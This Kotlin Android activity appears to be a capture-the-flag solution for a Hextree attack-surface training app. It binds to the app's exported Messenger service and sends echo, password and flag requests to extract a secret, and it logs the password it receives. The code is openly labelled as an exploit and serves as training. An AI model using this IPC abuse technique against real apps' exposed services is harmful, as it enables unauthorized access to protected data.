package com.pachinko.intentattacksurface

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.enableEdgeToEdge
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import java.util.concurrent.CompletableFuture
import kotlin.time.Duration.Companion.milliseconds

class Flag27Activity : ComponentActivity() {
    var mService: Messenger? = null
    var isBound = false

    val MSG_ECHO: Int = 1
    val MSG_GET_PASSWORD: Int = 2
    val MSG_GET_FLAG: Int = 3

    var password: String? = null
    val passwordFuture = CompletableFuture<String>()

    var mHandler = object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(message: Message) {
            val obj = message.obj
            val data = message.data
            
            Log.d("mHandler", "Received Message: what=${message.what}, obj=$obj")
            data?.keySet()?.forEach { key ->
                Log.d("mHandler", "  Bundle key: $key, value: ${data.get(key)}")
            }

            when(message.what) {
                MSG_GET_PASSWORD -> {
                    val pass = data.getString("password") ?: (obj as? String)
                    if (pass != null) {
                        Log.d("mHandler", "Got password: $pass")
                        password = pass
                        passwordFuture.complete(pass)
                    }
                }
                MSG_GET_FLAG -> {
                    Log.d("mHandler", "Got Flag")
                }
                else -> {
                    // Fallback for MSG_ECHO or others
                    if (obj is String) {
                        Log.d("mHandler", "Received generic string: $obj")
                    }
                }
            }
        }
    }

    var callBackMessenger = Messenger(mHandler)
    private val mConnection = object: ServiceConnection {
        override fun onServiceConnected(className: ComponentName, service: IBinder) {
            mService = Messenger(service)
            isBound = true
            Log.d("Flag26Activity", "Service Connected")
            exploit()
        }

        override fun onServiceDisconnected(classname: ComponentName) {
            mService = null
            isBound = false
            Log.d("Flag26Activity", "Service Disconnected")
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag27Service"
            )
        }
        bindService(intent, mConnection, Context.BIND_AUTO_CREATE)
    }

    fun exploit(){
        Thread {
            try {
                // Step 1: Send Echo
                val echoBundle = Bundle().apply {
                    putString("echo", "give flag")
                }
                val echoMessage = Message.obtain(null, MSG_ECHO)
                echoMessage.data = echoBundle
                echoMessage.replyTo = callBackMessenger
                Log.d("exploit", "Sending echo")
                mService?.send(echoMessage)

                // Step 2: Request Password
                val passwordMessage = Message.obtain(null, MSG_GET_PASSWORD)
                passwordMessage.replyTo = callBackMessenger
                // Some services expect a bundle even if empty, or specific fields
                passwordMessage.obj = Bundle().apply { putString("command", "get_password") }

                Log.d("exploit", "Sending password request")
                mService?.send(passwordMessage)

                // Wait for password from Handler
                val pass = passwordFuture.get()
                Log.d("exploit", "Proceeding with password: $pass")

                // Step 3: Send Flag request
                val flagBundle = Bundle().apply {
                    putString("password", pass)
                }
                val flagMessage = Message.obtain(null, MSG_GET_FLAG)
                flagMessage.data = flagBundle
                flagMessage.replyTo = callBackMessenger
                Log.d("exploit", "Sending flag request")
                mService?.send(flagMessage)

            } catch (e: Exception) {
                Log.e("exploit", "Exploit failed", e)
            }
        }.start()
    }
}